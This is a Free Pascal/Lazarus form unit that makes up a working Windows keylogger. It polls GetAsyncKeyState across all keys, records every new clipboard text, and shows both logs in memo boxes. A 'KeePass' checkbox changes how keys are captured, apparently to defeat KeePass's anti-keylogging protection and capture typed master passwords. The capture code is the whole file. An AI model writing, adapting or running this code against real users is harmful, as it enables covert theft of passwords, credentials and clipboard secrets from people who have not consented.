unit Unit1;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils, FileUtil, Forms, Controls, Graphics, Dialogs, StdCtrls,
  ExtCtrls, Windows, ClipBrd;

type

  { TForm1 }

  TForm1 = class(TForm)
    KeePass: TCheckBox;
    Label1: TLabel;
    Memo1: TMemo;
    Memo2: TMemo;
    Timer1: TTimer;
    Timer2: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
  private
    { private declarations }
  public
    { public declarations }
  end;

var
  Form1: TForm1;
  s: string;
  sp, sp2: TCaption;
  a: array[0..255] of integer;

implementation

{$R *.lfm}

{ TForm1 }

procedure TForm1.Timer1Timer(Sender: TObject);
var
  f: integer;
begin

  for f := 0 to 255 do if a[f] <> GetAsyncKeyState(f) then
  begin
    if KeePass.Checked and (GetAsyncKeyState(f) = 0) then
       sp := sp + chr(f);
    if not KeePass.Checked and (GetAsyncKeyState(f) <> 0) then
       sp := sp + chr(f);
  end;

  for f := 0 to 255 do a[f] := GetAsyncKeyState(f);

  if s <> Clipboard.AsText then
  begin
    s := Clipboard.AsText;
    sp2 := sp2 + s + ' ';
  end;
end;

procedure TForm1.Timer2Timer(Sender: TObject);
begin
  if Memo1.Caption <> sp then Memo1.Caption := sp;
  if Memo2.Caption <> sp2 then Memo2.Caption := sp2;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  sp := Memo1.Caption;
  sp2 := Memo2.Caption;
end;



end.

